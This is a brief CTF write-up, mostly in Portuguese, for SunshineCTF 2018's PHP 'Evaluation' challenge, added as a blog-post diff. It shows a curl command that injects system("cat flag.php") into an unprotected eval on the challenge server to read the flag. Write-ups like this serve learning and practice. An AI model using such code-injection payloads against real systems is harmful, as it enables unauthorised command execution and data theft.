@@ -1,0 +1,29 @@
+---
+title: "SunshineCtf - Evaluation Writeup"
+layout: post
+date: 2018-04-08
+categories: writeups
+---
+
+<code>"Evaluation
+<br>
+Evaluate your life.
+How are you doing, and are you doing the best you can possibly do?
+Look deeper within yourself, beyond the obvious.
+Look at the source of it all.
+<br>
+Also, here's a PHP challenge."</code>
+<br>
+A challenge nós dava o seguinte código:
+<br>
+<img src="https://i.imgur.com/1gRJwXK.png">
+<br>
+é notavel o <code>eval</code> desprotegido. Para conseguir a shell, é muito simples, podemos simplesmente adicionar um <code>system()</code> na request para ela ser incluida dentro do eval:
+<br>
+Para conseguir a shell, executei o seguinte comando para incluir o meu <code>system()</code>:
+{% highlight bash %}
+$ curl -d 'hello=system("cat flag.php")' -v "http://evaluation.web1.sunshinectf.org/"
+{% endhighlight %}
+<img src="https://i.imgur.com/hiniyjD.png">
+<br>
+
